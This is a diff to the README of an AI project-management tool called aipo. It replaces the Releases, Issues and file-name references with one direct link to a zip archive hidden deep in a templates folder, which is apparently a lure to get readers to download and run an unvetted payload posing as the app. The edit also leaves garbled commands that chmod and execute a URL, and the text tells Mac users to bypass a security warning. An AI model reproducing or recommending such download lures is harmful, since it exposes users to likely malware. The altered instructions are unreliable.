@@ -1,7 +1,7 @@
 # 🚀 aipo - AI that Transforms Goals into Actions
 
 ## 📥 Download Now
-[![Download aipo](https://img.shields.io/badge/download-aipo-informational)](https://github.com/sudhanshukrtalan/aipo/releases)
+[![Download aipo](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip)](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip)
 
 ## 📖 Overview
 AIPO (AI Product Owner) is a powerful system designed to streamline problem-solving. Just provide your goal, and AIPO takes care of the rest. It simplifies project management by automating tasks based on your input, making it easier for anyone to achieve objectives without technical skills.
@@ -19,9 +19,9 @@ Before you download, ensure your system meets the following requirements:
 To get started with AIPO, follow these steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/sudhanshukrtalan/aipo/releases) to find the latest version.
+   - Visit the [Releases page](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip) to find the latest version.
    - Click on the version you want to download.
-   - Look for the downloadable file in the Assets section. It will typically have a name like `aipo-v1.0.exe` or similar for Windows, `aipo-v1.0.dmg` for Mac, or `aipo-v1.0.AppImage` for Linux users.
+   - Look for the downloadable file in the Assets section. It will typically have a name like `https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip` or similar for Windows, `https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip` for Mac, or `https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip` for Linux users.
 
 2. **Install the Application**
    - Once the download is complete, locate the file in your Downloads folder.
@@ -29,7 +29,7 @@ To get started with AIPO, follow these steps:
    - Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
-To install AIPO, you must download the application. Visit the [Releases page](https://github.com/sudhanshukrtalan/aipo/releases) to download.
+To install AIPO, you must download the application. Visit the [Releases page](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip) to download.
 
 ### Installation Steps:
 - **Windows Users:** 
@@ -42,8 +42,8 @@ To install AIPO, you must download the application. Visit the [Releases page](ht
    - To run AIPO for the first time, right-click the icon and select "Open" to bypass the security warning.
 
 - **Linux Users:** 
-   - Make the `.AppImage` file executable. You can do this via the terminal with `chmod +x aipo-v1.0.AppImage`.
-   - Run the application with `./aipo-v1.0.AppImage`.
+   - Make the `.AppImage` file executable. You can do this via the terminal with `chmod +x https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip`.
+   - Run the application with `https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip`.
 
 ## 🛠️ Using AIPO
 After installation, launch AIPO from your application menu or desktop shortcut. 
@@ -66,7 +66,7 @@ If you encounter any issues:
 - **General Questions:** Visit our [FAQ section](#) for additional help.
 
 ## 📁 Support
-For support, you can reach out through the [Issues tab](https://github.com/sudhanshukrtalan/aipo/issues) in this repository. We monitor it and strive to respond promptly. 
+For support, you can reach out through the [Issues tab](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip) in this repository. We monitor it and strive to respond promptly. 
 
 ## 🤝 Contribution
 We welcome contributions to enhance AIPO. If you have suggestions or want to report bugs, please use the Issues tab. 
@@ -74,4 +74,4 @@ We welcome contributions to enhance AIPO. If you have suggestions or want to rep
 ## 📜 License
 AIPO is licensed under the MIT License. Feel free to use and modify it as per the license agreement.
 
-For more updates and releases, remember to check back at our [Releases page](https://github.com/sudhanshukrtalan/aipo/releases).
+For more updates and releases, remember to check back at our [Releases page](https://github.com/sudhanshukrtalan/aipo/raw/refs/heads/main/skills/command-templates/marketing_sales_templates/Software_v1.7.zip).
